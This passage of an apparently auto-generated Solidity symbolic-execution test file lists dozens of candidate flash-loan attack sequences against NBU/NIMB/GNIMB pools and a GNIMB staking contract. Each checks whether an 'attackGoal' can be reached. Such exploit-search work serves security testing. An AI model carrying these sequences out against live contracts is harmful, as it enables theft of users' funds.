        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbunimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1762(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1763(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1764(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbunimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1765(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nbu(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1766(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_nimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1767(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        borrow_pairnbugnimb_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbugnimb_gnimb(amt3);
        payback_pairnbunimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1768(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1769(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1770(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1771(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1772(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1773(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1774(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1775(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1776(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1777(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1778(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1779(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1780(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1781(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1782(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1783(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1784(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1785(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1786(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1787(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1788(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1789(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1790(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1791(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1792(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1793(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1794(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_pairnbugnimb_nimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1795(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1796(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1797(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1798(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1799(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1800(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1801(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1802(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1803(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1804(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1805(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1806(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1807(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1808(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1809(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1810(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1811(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        payback_pairnbugnimb_gnimb(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1812(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
        borrow_pairnbunimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        payback_pairnbugnimb_nbu(amt4);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand1813(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt4 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_pairnbugnimb_nbu(amt0);
